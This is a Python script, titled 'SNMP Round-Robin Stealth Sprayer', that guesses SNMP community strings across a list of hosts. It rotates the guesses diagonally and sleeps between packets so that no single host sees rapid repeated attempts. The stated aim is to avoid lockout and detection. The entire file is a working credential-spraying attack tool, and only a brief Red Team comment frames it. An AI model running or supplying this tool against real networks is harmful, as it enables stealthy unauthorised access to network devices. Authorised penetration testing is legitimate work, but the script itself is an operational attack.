#!/usr/bin/env python3
"""
SNMP Round-Robin Stealth Sprayer
Author: Senior Security Dev
Logic: (Host A:Pass 1) -> (Host B:Pass 2) -> (Host C:Pass 3)
This ensures the longest possible time gap for a single host to see a 
sequential password attempt.
"""

import argparse
import time
import sys
from itertools import cycle
from pysnmp.hlapi import *

def snmp_probe(target, community, version):
    """
    Performs a single SNMP GET. 
    Version mapping: 0 = v1, 1 = v2c
    """
    # Use a common OID: sysName (1.3.6.1.2.1.1.5.0)
    errorIndication, errorStatus, errorIndex, varBinds = next(
        getCmd(SnmpEngine(),
               CommunityData(community, mpModel=version),
               UdpTransportTarget((target, 161), timeout=2, retries=0),
               ContextData(),
               ObjectType(ObjectIdentity('1.3.6.1.2.1.1.5.0')))
    )
    
    if not errorIndication and not errorStatus:
        return True, str(varBinds[0][1])
    return False, None

def main():
    parser = argparse.ArgumentParser(
        description="Diagonal SNMP Round-Robin Sprayer",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-i", "--hosts", required=True, help="File with IP addresses")
    parser.add_argument("-p", "--passwords", required=True, help="File with community strings")
    parser.add_argument("-v", "--version", choices=['1', '2c'], default='2c', help="SNMP Version (Default: 2c)")
    parser.add_argument("-s", "--sleep", type=float, default=10.0, help="Seconds between ANY packet (Default: 10s)")
    
    args = parser.parse_args()
    snmp_ver = 0 if args.version == '1' else 1

    # Load data
    try:
        with open(args.hosts, 'r') as f:
            host_list = [line.strip() for line in f if line.strip()]
        with open(args.passwords, 'r') as f:
            pass_list = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[-] File Error: {e}")
        sys.exit(1)

    # Use a cycle iterator for passwords to keep the round-robin going 
    # even if one list is shorter than the other.
    pass_iterator = cycle(pass_list)
    
    total_attempts = len(host_list) * len(pass_list)
    print(f"[*] Starting Round-Robin. Total attempts to be made: {total_attempts}")
    print(f"[*] Pattern: Host[N] with Pass[N], then Host[N+1] with Pass[N+1]")

    count = 0
    # We loop through the password list as the primary driver to ensure 
    # every password is tried against every host eventually.
    for p_idx in range(len(pass_list)):
        for h_idx in range(len(host_list)):
            current_host = host_list[h_idx]
            # This logic ensures Host 1 gets Pass 1, then next time Host 1 gets Pass 2
            current_pass = pass_list[(p_idx + h_idx) % len(pass_list)]
            
            success, result = snmp_probe(current_host, current_pass, snmp_ver)
            
            if success:
                print(f"[!] SUCCESS: {current_host} | Community: {current_pass} | Name: {result}")
            else:
                # Silent or verbose based on preference; Red Team usually prefers minimal noise
                pass 

            count += 1
            time.sleep(args.sleep)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exit requested.")
